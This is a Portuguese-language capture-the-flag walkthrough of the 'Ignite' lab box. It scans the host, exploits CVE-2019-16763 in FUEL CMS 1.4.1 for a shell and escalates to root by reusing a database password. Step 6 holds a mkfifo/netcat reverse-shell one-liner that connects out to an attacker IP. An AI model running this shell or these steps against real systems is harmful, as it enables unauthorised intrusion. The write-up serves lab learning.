1. Adicionar o endereço IP ($ip) ao arquivo hosts:
   ```
   sudo echo "$ip" >> /etc/hosts
   ```

2. Realizar um scan Nmap no servidor "ignite.thm" para identificar serviços e softwares:
   ```
   nmap ignite.thm -sV
   PORT   STATE SERVICE  REASON  VERSION
   80/tcp open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
   | http-robots.txt: 1 disallowed entry
   |_/fuel/
   |_http-server-header: Apache/2.4.18 (Ubuntu)
   |_http-title: Welcome to FUEL CMS
   | http-methods:
   |_  Supported Methods: GET HEAD POST OPTIONS
   ```

3. Verificação do conteúdo de robots.txt:
   ```
   Disallow: /fuel/
   ```

4. Acessar o diretório /fuel no servidor "ignite.thm" e encontrar um CMS com a versão 1.4.1 com uma CVE-2019-16763.

5. Baixar o exploit para a CVE-2019-16763 e obter uma shell como o usuário "www-data".

6. Usar FIFO para criar um arquivo em /tmp/ que permite a comunicação entre processos:
   ```
   rm /tmp/shell; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.44.97 44444 >/tmp/f
   ```

7. Em sua máquina atacante, executar o comando para ouvir a conexão reversa:
   ```
   nc -nlvp 44444
   ```

8. Verificar se o Python está presente no servidor:
   ```
   locate python3
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

9. Analisar os arquivos de configuração do Fuel CMS no servidor e encontrar o arquivo "database.php" com permissões de leitura e gravação para todos os usuários.

10. Encontrar a senha do banco de dados no arquivo "database.php":
    ```
    'password' => '???????',
    ```

11. Tentar fazer login como usuário "root" com a mesma senha encontrada.

12. Conseguir acesso como "root" e obter as flags:
    - User: ???????????????????????????????.flag
    - Root: ???????????????????????????????.flag

Essas etapas descrevem o processo de invasão e obtenção de acesso root no servidor "ignite.thm". Lembre-se de que essas atividades devem ser realizadas de maneira ética e em conformidade com as leis e regulamentos aplicáveis.
